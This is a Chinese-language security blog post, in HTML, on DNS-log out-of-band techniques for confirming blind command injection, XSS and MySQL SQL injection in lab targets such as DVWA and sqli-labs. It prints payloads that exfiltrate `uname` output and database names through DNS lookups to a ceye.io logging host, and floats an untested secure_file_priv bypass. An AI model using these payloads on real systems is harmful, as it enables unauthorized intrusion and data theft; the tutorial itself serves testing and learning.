@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="0x00 前言最近在熟悉PoC的编写，对PoC遵循的无损扫描和减少误报漏报的原则特别深刻。 自己也“画蛇添足”加了一点儿对PoC特性的理解：  此篇文章具体参见公众号【Rj45mp】《记一次编写布尔盲注-poc的思考》，提及该点是为了说明一下PoC的无损扫描。而对于减少误报漏报,这一点还得说起昨晚我在编写时间盲注-poc的时候遇到的问题：  参见我的博客子站文章《时间盲注-poc》,当时为了规避影">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DNS-log-让数据通过DNS解析日志传回来">
+<meta property="og:url" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;DNS-log&#x2F;">
+<meta property="og:site_name" content="Rj45&#39;s blog">
+<meta property="og:description" content="0x00 前言最近在熟悉PoC的编写，对PoC遵循的无损扫描和减少误报漏报的原则特别深刻。 自己也“画蛇添足”加了一点儿对PoC特性的理解：  此篇文章具体参见公众号【Rj45mp】《记一次编写布尔盲注-poc的思考》，提及该点是为了说明一下PoC的无损扫描。而对于减少误报漏报,这一点还得说起昨晚我在编写时间盲注-poc的时候遇到的问题：  参见我的博客子站文章《时间盲注-poc》,当时为了规避影">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;DNS-log&#x2F;image-20200103153516395.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;DNS-log&#x2F;image-20200103154309060.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;DNS-log&#x2F;image-20200103163932797.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;DNS-log&#x2F;image-20200103165246424.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;DNS-log&#x2F;image-20200103165313757.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;DNS-log&#x2F;image-20200103171329830.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;DNS-log&#x2F;image-20200103171551887.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;DNS-log&#x2F;image-20200103171649488.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;DNS-log&#x2F;image-20200103172728251.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;DNS-log&#x2F;image-20200103172805804.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;DNS-log&#x2F;image-20200103232235047.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;DNS-log&#x2F;image-20200103232935253.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;DNS-log&#x2F;image-20200103233055174.png">
+<meta property="og:updated_time" content="2020-01-03T15:44:44.601Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;rj45mp.github.io&#x2F;DNS-log&#x2F;image-20200103153516395.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/my.jpg">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/my.jpg" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/my.jpg">
+          
+        
+    
+    <!-- title -->
+    <title>DNS-log-让数据通过DNS解析日志传回来</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+<link rel="alternate" href="/atom.xml" title="Rj45's blog" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">home</a></li>
+         
+          <li><a href="/archives/">articles</a></li>
+         
+          <li><a href="/web/">web</a></li>
+         
+          <li><a href="/penetration/">penetration</a></li>
+         
+          <li><a href="/pwn/">pwn</a></li>
+         
+          <li><a href="/docker">docker</a></li>
+         
+          <li><a href="/resources/">resources</a></li>
+         
+          <li><a href="/firends/">firends</a></li>
+         
+          <li><a href="/about/">about</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2019-Rj45mp-%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://rj45mp.github.io/DNS-log/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://rj45mp.github.io/DNS-log/&text=DNS-log-让数据通过DNS解析日志传回来" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://rj45mp.github.io/DNS-log/&title=DNS-log-让数据通过DNS解析日志传回来" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rj45mp.github.io/DNS-log/&is_video=false&description=DNS-log-让数据通过DNS解析日志传回来" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=DNS-log-让数据通过DNS解析日志传回来&body=Check out this article: https://rj45mp.github.io/DNS-log/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://rj45mp.github.io/DNS-log/&title=DNS-log-让数据通过DNS解析日志传回来" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://rj45mp.github.io/DNS-log/&title=DNS-log-让数据通过DNS解析日志传回来" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://rj45mp.github.io/DNS-log/&title=DNS-log-让数据通过DNS解析日志传回来" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://rj45mp.github.io/DNS-log/&title=DNS-log-让数据通过DNS解析日志传回来" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://rj45mp.github.io/DNS-log/&name=DNS-log-让数据通过DNS解析日志传回来&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-DNS-log"><span class="toc-number">2.</span> <span class="toc-text">0x01 DNS-log</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-准备"><span class="toc-number">3.</span> <span class="toc-text">0x02 准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-实验"><span class="toc-number">4.</span> <span class="toc-text">0x03 实验</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0、测试"><span class="toc-number">4.1.</span> <span class="toc-text">0、测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1、命令注入"><span class="toc-number">4.2.</span> <span class="toc-text">1、命令注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2、XSS"><span class="toc-number">4.3.</span> <span class="toc-text">2、XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3、SQL注入"><span class="toc-number">4.4.</span> <span class="toc-text">3、SQL注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-参考"><span class="toc-number">5.</span> <span class="toc-text">0x04 参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        DNS-log-让数据通过DNS解析日志传回来
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Rj45's blog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-01-03T07:23:33.000Z" itemprop="datePublished">2020-01-03</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近在熟悉PoC的编写，对PoC遵循的<code>无损扫描</code>和<code>减少误报漏报</code>的原则特别深刻。</p>
+<p>自己也“画蛇添足”加了一点儿对PoC特性的理解：</p>
+<p><img src="/DNS-log/image-20200103153516395.png" alt="image-20200103153516395"></p>
+<p>此篇文章具体参见公众号【Rj45mp】《<a href="https://mp.weixin.qq.com/s?__biz=MzU5NDMwMjU3OA==&mid=2247484414&idx=1&sn=9f3c85e001026504a0bada3352946ac5&chksm=fe0200e3c97589f5024ee4fc0d33bbdb62a04c3e66a9c02363e40452545d163acf10fb24863d&scene=0&xtrack=1&key=9178b5e3f94ce552fb79af8e16ba487747dc58dc58d1d88e13ad0fca3bccfbc419879e3fd3089a201abb8bd088f132ec65cd5d4a178108b7be037f46b71b1da741ea6904c23f6db78970df72f05c5154&ascene=1&uin=MTgzNDg3MTQ4Mg%3D%3D&devicetype=Windows+10&version=62070158&lang=zh_CN&exportkey=AwEQhm3dgm6fA2MeiwpouCI%3D&pass_ticket=HaCFJHyoFaMiFQHhVB0dGEi%2BghJ3AYyxuxBISgz6YmiPy22xFEY6s0A92R6jC6gN" target="_blank" rel="noopener">记一次编写布尔盲注-poc的思考</a>》，提及该点是为了说明一下PoC的<code>无损扫描</code>。而对于<code>减少误报漏报</code>,这一点还得说起昨晚我在编写时间盲注-poc的时候遇到的问题：</p>
+<p><img src="/DNS-log/image-20200103154309060.png" alt="image-20200103154309060"></p>
+<p>参见我的博客子站文章《<a href="http://47.103.125.66:6868/index.php/archives/38/" target="_blank" rel="noopener">时间盲注-poc</a>》,当时为了规避影响时间盲注的客观因素，采用了时间差的做法，然而再三思考下，还是仍然感觉有点不妥，特别是在数据没有回显回来的场景下，利用存在诸多客观条件影响下的时间差做法，总感觉不是很踏实<del>Rj45mp=稳健男孩 :)</del>。在参考了《<a href="http://doc.bugscan.net/" target="_blank" rel="noopener">BugScan插件开发文档</a>)》的命令注入章节下，于是有了这篇文章《DNS-log-让数据通过DNS解析日志传回来》(带外攻击)。</p>
+<h2 id="0x01-DNS-log"><a href="#0x01-DNS-log" class="headerlink" title="0x01 DNS-log"></a>0x01 DNS-log</h2><p>1、概念：</p>
+<p>DNS解析，也叫域名解析，是将域名解析到一个IP地址的过程。作用就是为了便于记忆。<del>毕竟人类对字母的记忆维持程度会比对数字的强</del>，IP地址会因很多因素而变化，不过域名总是不变的。</p>
+<p>2、过程：</p>
+<p><img src="/DNS-log/image-20200103163932797.png" alt="image-20200103163932797"></p>
+<p>在每一步的DNS解析过程中，服务器都会留下解析的日志记录。我们可以通过查看DNS的解析日志来查看某些信息。</p>
+<p>这有点类似于web服务和SSH服务在访问成功和访问失败都会记录到日志中。</p>
+<h2 id="0x02-准备"><a href="#0x02-准备" class="headerlink" title="0x02 准备"></a>0x02 准备</h2><p>环境准备：</p>
+<p>1、<a href="http://ceye.io/" target="_blank" rel="noopener">ceye</a></p>
+<p>2、dvwa或sqli-labs</p>
+<h2 id="0x03-实验"><a href="#0x03-实验" class="headerlink" title="0x03 实验"></a>0x03 实验</h2><h3 id="0、测试"><a href="#0、测试" class="headerlink" title="0、测试"></a>0、测试</h3><p>ceye注册后会自动分配一个三级域名，任意测试一个四级域名：</p>
+<p><img src="/DNS-log/image-20200103165246424.png" alt="image-20200103165246424"></p>
+<p>可以看到有解析的记录日志产生：</p>
+<p><img src="/DNS-log/image-20200103165313757.png" alt="image-20200103165313757"></p>
+<h3 id="1、命令注入"><a href="#1、命令注入" class="headerlink" title="1、命令注入"></a>1、命令注入</h3><p>正常命令注入：</p>
+<p><img src="/DNS-log/image-20200103171329830.png" alt="image-20200103171329830"></p>
+<p>假设没有数据回显：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 | ping -c 4 `uname`.xxx.ceye.io</span><br></pre></td></tr></table></figure>
+
+<p><img src="/DNS-log/image-20200103171551887.png" alt="image-20200103171551887"></p>
+<p>ceye平台回显：</p>
+<p><img src="/DNS-log/image-20200103171649488.png" alt="image-20200103171649488"></p>
+<h3 id="2、XSS"><a href="#2、XSS" class="headerlink" title="2、XSS"></a>2、XSS</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;http://Rj45mp.xxx.ceye.io&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/DNS-log/image-20200103172728251.png" alt="image-20200103172728251"></p>
+<p>有解析日志说明payload插入成功，存在XSS：</p>
+<p><img src="/DNS-log/image-20200103172805804.png" alt="image-20200103172805804"></p>
+<h3 id="3、SQL注入"><a href="#3、SQL注入" class="headerlink" title="3、SQL注入"></a>3、SQL注入</h3><p>环境为mysql,在SQL注入无数据回显的情况下，可以利用mysql的函数<code>load_file</code>可以发送DNS解析请求。</p>
+<p>同时该函数的使用条件必须为<code>secure_file_priv</code>为非<code>NULL</code>。</p>
+<p>如果在mysql终端可以利用如下命令进行查看：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;secure_file_priv&apos;;</span><br></pre></td></tr></table></figure>
+
+<p>如果是在web端SQL注入位置，可以利用如下语句进行查看：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select if((select variable_value from performance_schema.global_variables where variable_name=&apos;secure_file_priv&apos;),1,sleep(5));</span><br></pre></td></tr></table></figure>
+
+<p>如果为<code>NULL</code>，则延时5秒。</p>
+<p>为进行测试，开启<code>secure_file_priv</code>如下：</p>
+<p><img src="/DNS-log/image-20200103232235047.png" alt="image-20200103232235047"></p>
+<p>SQL注入攻击：</p>
+<p><img src="/DNS-log/image-20200103232935253.png" alt="image-20200103232935253"></p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=&apos; and if((select load_file(concat(&apos;\\\\&apos;,(select database()),&apos;.xxx.ceye.io\\abc&apos;))),1,1) -- -&amp;passwd=1&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+
+<p>ceye回显：</p>
+<p><img src="/DNS-log/image-20200103233055174.png" alt="image-20200103233055174"></p>
+<p>思考：对于SQL注入的DNS带外攻击，在利用过程中，对于<code>load_file</code>的<code>secure_file_priv</code>条件，始终是个问题。</p>
+<p>我的绕过想法是：利用<code>into outfile</code>将payload写入到/tmp目录下，然后再利用<code>load_file</code>导入/tmp目录下的payload，实现在导入的过程中执行带外攻击，绕过<code>secure_file_priv</code>条件。</p>
+<p>尽管<code>secure_file_priv=NULL</code>意味着<code>load_file</code>不能加载文件，可是在某次测试的过程中，我发现还是可以把某些如<code>/etc/passwd</code>文件或/tmp目录下的文件导入，所以设想假如把DNS带外攻击的payload导出到/tmp目录，然后导入执行，或许可以达到攻击的目的。<del>设想的过程尚未做实验验证</del></p>
+<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p> <a href="https://www.cnblogs.com/rnss/p/11320305.html" target="_blank" rel="noopener">https://www.cnblogs.com/rnss/p/11320305.html</a> </p>
+<p>另，关于DNS-log的应用，还有很多技巧，具体可参考【ceye平台介绍】</p>
+
+  </div>
+</article>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">home</a></li>
+         
+          <li><a href="/archives/">articles</a></li>
+         
+          <li><a href="/web/">web</a></li>
+         
+          <li><a href="/penetration/">penetration</a></li>
+         
+          <li><a href="/pwn/">pwn</a></li>
+         
+          <li><a href="/docker">docker</a></li>
+         
+          <li><a href="/resources/">resources</a></li>
+         
+          <li><a href="/firends/">firends</a></li>
+         
+          <li><a href="/about/">about</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-DNS-log"><span class="toc-number">2.</span> <span class="toc-text">0x01 DNS-log</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-准备"><span class="toc-number">3.</span> <span class="toc-text">0x02 准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-实验"><span class="toc-number">4.</span> <span class="toc-text">0x03 实验</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0、测试"><span class="toc-number">4.1.</span> <span class="toc-text">0、测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1、命令注入"><span class="toc-number">4.2.</span> <span class="toc-text">1、命令注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2、XSS"><span class="toc-number">4.3.</span> <span class="toc-text">2、XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3、SQL注入"><span class="toc-number">4.4.</span> <span class="toc-text">3、SQL注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-参考"><span class="toc-number">5.</span> <span class="toc-text">0x04 参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://rj45mp.github.io/DNS-log/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://rj45mp.github.io/DNS-log/&text=DNS-log-让数据通过DNS解析日志传回来" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://rj45mp.github.io/DNS-log/&title=DNS-log-让数据通过DNS解析日志传回来" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rj45mp.github.io/DNS-log/&is_video=false&description=DNS-log-让数据通过DNS解析日志传回来" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=DNS-log-让数据通过DNS解析日志传回来&body=Check out this article: https://rj45mp.github.io/DNS-log/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://rj45mp.github.io/DNS-log/&title=DNS-log-让数据通过DNS解析日志传回来" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://rj45mp.github.io/DNS-log/&title=DNS-log-让数据通过DNS解析日志传回来" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://rj45mp.github.io/DNS-log/&title=DNS-log-让数据通过DNS解析日志传回来" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://rj45mp.github.io/DNS-log/&title=DNS-log-让数据通过DNS解析日志传回来" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://rj45mp.github.io/DNS-log/&name=DNS-log-让数据通过DNS解析日志传回来&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 Rj45
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">home</a></li>
+         
+          <li><a href="/archives/">articles</a></li>
+         
+          <li><a href="/web/">web</a></li>
+         
+          <li><a href="/penetration/">penetration</a></li>
+         
+          <li><a href="/pwn/">pwn</a></li>
+         
+          <li><a href="/docker">docker</a></li>
+         
+          <li><a href="/resources/">resources</a></li>
+         
+          <li><a href="/firends/">firends</a></li>
+         
+          <li><a href="/about/">about</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<!-- clipboard -->
+
+  <script src="/lib/clipboard/clipboard.min.js"></script>
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+    <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?539c6b41d72f90d25e5ad9d0db4f2321";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
